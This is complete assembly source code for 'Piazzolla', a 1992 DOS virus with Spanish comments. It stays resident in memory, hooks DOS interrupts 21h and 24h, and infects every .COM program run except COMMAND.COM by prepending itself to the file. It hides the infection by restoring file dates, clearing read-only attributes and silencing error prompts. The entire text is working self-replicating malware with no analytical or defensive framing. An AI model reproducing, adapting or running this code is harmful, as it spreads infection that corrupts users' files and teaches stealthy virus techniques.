

;--------------------------------------------------------------
;                           Piazzolla
;        Virus no overwriting, resident, .com infector
;                 does not infects Command.com
;              Created:   Wednesday July 15, 1992
;--------------------------------------------------------------

envir_seg       equ     2Ch
tamano          equ     offset comstart
identificador   equ     'ai'

seg_a           segment
                assume  cs:seg_a, ds:seg_a

                org     100h

instala         proc    far

start:
                jmp     short empezar
;-----------------------------------------------------------------
; bytes de Copyright
;-----------------------------------------------------------------
                db      'P'
                dw      identificador
                db      'zzolla'
                db      0
;-----------------------------------------------------------------
empezar:
                mov     origax,ax
                mov     si,tamano
                mov     di,100h
                mov     ah,0DDh
                mov     cx,0FF00h
                sub     cx,tamano
                int     21h                     ; DOS Services  ah=function DDh
                                                ; Chequear si el virus
                                                ; est  en memoria
                                                ; Si es as¡,
                                                ; ubica el com original
                                                ; donde deber¡a estar y
                                                ; salta al com original.

;------------------------------------------------------------------------------
;Vamos a dejar residente el virus e instalamos la 21 trucha.. ja... ja...
;------------------------------------------------------------------------------

                mov     ax,3521h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     int21hseg,es
                mov     int21hofs,bx
                mov     dx,offset int_21
                mov     ax,2521h
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx

                mov     sp,tamano
                mov     bx,tamano
                mov     ah,4Ah
                push    ds
                pop     es
                add     bx,0Fh
                shr     bx,1                    ; Shift w/zeros fill
                shr     bx,1                    ; Shift w/zeros fill
                shr     bx,1                    ; Shift w/zeros fill
                shr     bx,1                    ; Shift w/zeros fill
                mov     tamres,bx
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                mov     cx,0FFFFh
                xor     ax,ax                   ; Zero register
                xor     di,di                   ; Zero register
                mov     es,ds:envir_seg
loc_3:
                repne   scasb                   ; Rept zf=0+cx>0 Scan es:[di] for al
                cmp     byte ptr es:[di],0
                je      loc_4                   ; Jump if equal
                scasb                           ; Scan es:[di] for al
                jnz     loc_3                   ; Jump if not zero
loc_4:
                mov     dx,di
                add     dx,3
                push    es
                pop     ds
                mov     bx,13Ah
                mov     ax,4B00h
                push    cs
                pop     es
;------------------------------------------------------------------------
                pushf                           ; Push flags
                call    dword ptr cs:int21h
                mov     ah,4Dh
                int     21h                     ; DOS Services  ah=function 4Dh
                                                ;  get return code info in ax
                mov     dx,cs:tamres
                mov     ah,31h
                int     21h                     ; DOS Services  ah=function 31h
                                                ;  terminate & stay resident

instala         endp

;------ Handler de interrupci¢n 21h tomada por el virus --------------
;------ Servicios: 0DDh (auto-check) 4B00h (exec load and execute) ---

int_21:
int_21h_entry   proc    far

                pushf                           ; Push flags
                cmp     ah,0DDh
                je      res_original            ; Jump if equal
                                                ; virus ya instalado

                cmp     ax,4B00h                ; es exec? (load and execute)
                je      doexec                  ; Jump if equal

vuelta21h:                                      ; vuelta a la int. 21h normal
                popf                            ; Pop flags
                jmp     dword ptr cs:int21h
res_original:
                pop     ax
                pop     ax
                mov     ax,100h
                mov     cs:origentryofs,ax
                pop     ax
                mov     cs:origentryseg,ax
                rep     movsb                   ; Rep while cx>0 Mov [si] to es:[di]
                                                ; Copia el resto del segmento
                                                ; que sigue al virus a partir
                                                ; de 100h para
                                                ; devolverle el control

                xor     ax,ax                   ; Zero register
                push    ax
                mov     ax,cs:origax
                jmp     dword ptr cs:origentry
;-----------------------------------------------------
doexec:
                mov     cs:stackptr,sp
                mov     cs:stackseg,ss
                push    cs
                pop     ss
                mov     sp,tamano
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                mov     ah,19h
                mov     cs:spsave,sp
                int     21h                     ; DOS Services  ah=function 19h
                                                ;  get default drive al  (0=a:)
                add     al,41h
                mov     cs:drive2,al
                mov     cs:drive,al
                mov     di,offset victima
                push    di
                mov     si,dx
                cmp     byte ptr [si+1],3Ah
                jne     loc_8                   ; Jump if not equal
                mov     al,[si]
                mov     cs:drive2,al
                mov     cs:drive,al
                add     si,2
loc_8:
                push    cs
                pop     es
                mov     cx,3Fh

locloop_9:
                lodsb                           ; String [si] to al
                cmp     al,61h
                jb      loc_10                  ; Jump if below
                cmp     al,7Ah
                ja      loc_10                  ; Jump if above
                add     al,0E0h
loc_10:
                stosb                           ; Store al to es:[di]
                loop    locloop_9               ; Loop if cx > 0

                pop     di
                push    cs
                pop     ds
                mov     cx,40h
                mov     al,2Eh
                repne   scasb                   ; Rept zf=0+cx>0 Scan es:[di] for al
                mov     cx,3
                mov     si,offset extension
                repe    cmpsb                   ; Rept zf=1+cx>0 Cmp [si] to es:[di]
                jz      loc_12                  ; Jump if zero
                jmp     vuelta
loc_11:
                jmp     hecho
loc_12:
                sub     di,0Bh
                mov     cx,7
                mov     si,offset sistema
                repe    cmpsb                   ; Rept zf=1+cx>0 Cmp [si] to es:[di]
                jnz     loc_13                  ; Jump if not zero
                jmp     vuelta
;-------------------------------------------------------------------------------
loc_13:
                mov     ax,3524h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     int24hseg,es
                mov     int24hofs,bx
                mov     ax,2524h
                mov     dx,offset int_24
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx

;------------------------------------------------------------------------------
;Abre el file que se trata de ejecutar, lee y guarda los 9 primeros bytes,
;guarda fecha y hora del file y cierra el file
;------------------------------------------------------------------------------
                mov     dx,offset path
                mov     ax,3D00h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                mov     bx,ax
                mov     cx,9
                mov     dx,offset buffer
                mov     ah,3Fh
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      loc_11                  ; Jump if carry Set

                mov     ax,5700h
                int     21h                     ; DOS Services  ah=function 57h
                                                ; get file date & time
                mov     fecha,dx
                mov     hora,cx

                mov     ah,3Eh
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
;---------------------------------------------------------------------------
;crea un archivo temporario y escribe este codigo
;---------------------------------------------------------------------------

                cmp     buffer,05A4Dh           ;'MZ'
                je      hecho_a                 ; Es un .exe con extensi¢n .com?

                cmp     virus_ID,identificador
                je      loc_11                  ; Jump if equal (el archivo ya
                                                ; esta contaminado)

                xor     cx,cx                   ; Zero register
                mov     ah,3Ch
                mov     dx,offset drive2
                int     21h                     ; DOS Services  ah=function 3Ch
                                                ;  create/truncate file @ ds:dx
                jc      loc_11                  ; Jump if carry Set
                mov     bx,ax
                mov     ah,40h
                mov     cx,tamano-100h
                mov     dx,100h
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                cmp     ax,cx
                jne     hecho_a                 ; Jump if not equal
;------------------------------------------------------------------------------
                mov     fhandle,bx
                mov     ax,3D00h
                mov     dx,offset path
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                jc      hecho_a                 ; Jump if carry Set
                mov     bx,ax
                push    bx
                mov     ah,48h
                mov     bx,500h
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                pop     bx
                mov     ds,ax
                xor     dx,dx                   ; Zero register
loc_14:
                mov     ah,3Fh
                mov     cx,5000h
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      hecho_a                 ; Jump if carry Set
                cmp     ax,0
                je      loc_16                  ; Jump if equal
                mov     cx,ax
                xchg    bx,cs:fhandle
                mov     ah,40h
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                cmp     ax,cx
                jne     hecho_a                 ; Jump if not equal
                xchg    bx,cs:fhandle
                jmp     short loc_14

hecho_a:
                jmp     hecho

loc_16:
                push    ds
                pop     es
                mov     ah,49h
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
                push    cs
                push    cs
                pop     es
                pop     ds
                mov     ah,3Eh
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                jc      hecho_a                 ; Jump if carry Set

                mov     bx,fhandle
                mov     ah,3Eh
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                jc      hecho_a                 ; Jump if carry Set
                mov     ax,4301h
                mov     dx,offset path
                xor     cx,cx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 43h
                                                ; set file attrb, nam@ds:dx
                                                ; lo pone en 0 para evitar RO
                mov     ah,41h
                int     21h                     ; DOS Services  ah=function 41h
                                                ;  delete file, name @ ds:dx

; Ac  est  el re-copiado anti-novi ************************************

                mov     dx,offset path
                mov     ah,3Ch
                xor     cx,cx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 3Ch
                                                ;  create/truncate file @ ds:dx
                jc      hecho                   ; Jump if carry Set

                mov     fhandle,bx
                mov     dx,offset drive2
                mov     ax,3D00h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                jc      hecho                   ; Jump if carry Set

                mov     bx,ax
                push    bx
                mov     bx,500h
                mov     ah,48h
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                pop     bx
                xor     dx,dx                   ; Zero register
                mov     ds,ax
loc_14bis:
                mov     cx,5000h
                mov     ah,3Fh
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      hecho                   ; Jump if carry Set
                cmp     ax,0
                je      loc_16bis               ; Jump if equal
                mov     cx,ax
                xchg    bx,cs:fhandle
                mov     ah,40h
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                cmp     ax,cx
                jne     hecho                   ; Jump if not equal
                xchg    bx,cs:fhandle
                jmp     short loc_14bis
loc_16bis:
                push    ds
                pop     es
                mov     ah,49h
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
                push    cs
                push    cs
                pop     es
                pop     ds
                mov     ah,3Eh
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                jc      hecho                   ; Jump if carry Set

                mov     bx,fhandle
                mov     ax,5701h
                mov     dx,fecha
                mov     cx,hora
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  set file date & time
                mov     ah,3Eh
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                jc      hecho                   ; Jump if carry Set

                mov     dx,offset drive2
                mov     ah,41h
                int     21h                     ; DOS Services  ah=function 41h
                                                ;  delete file, name @ ds:dx

;--------------------------------------------------------------------------
;hecho: se restaura la int 24 de manejo de errores...
;--------------------------------------------------------------------------

hecho:
                mov     ds,int24hseg
                mov     dx,int24hofs
                mov     ax,2524h
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx

vuelta:
                push    cs
                pop     ds
                mov     sp,cs:spsave
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                mov     ss,cs:stackseg
                mov     sp,cs:stackptr

                jmp     vuelta21h

int_21h_entry   endp

; -------------- Handler de interrupci¢n 24 (errores del DOS) -------

int_24:
int_24h_entry   proc    far

                xor     al,al                   ; Zero register
                iret                            ; Interrupt return

int_24h_entry   endp

; siguen todos los datos ------------------------------------------------

stackptr        dw      0
stackseg        dw      0

int21h:
int21hofs       dw      0
int21hseg       dw      0

int24h:
int24hofs       dw      0
int24hseg       dw      0

origentry:
origentryofs    dw      0
origentryseg    dw      0

origax          dw      0

spsave          dw      0

fecha           dw      0
hora            dw      0

tamres          dw      0

path:
drive           db      0
                db      ':'
victima:        db      64 dup (0)

sistema:        db      'COMMAND'
extension       db      'COM'

buffer          dw      0
                db      0
virus_ID        dw      0
                db      4 dup (0)

fhandle         dw      0

drive2          db      0
                db      ':Piazzoll.$$$'
                db      0

int21hstack     db 60 dup (0)

comstart        db      0CDh, 20h

seg_a           ends

                end     start


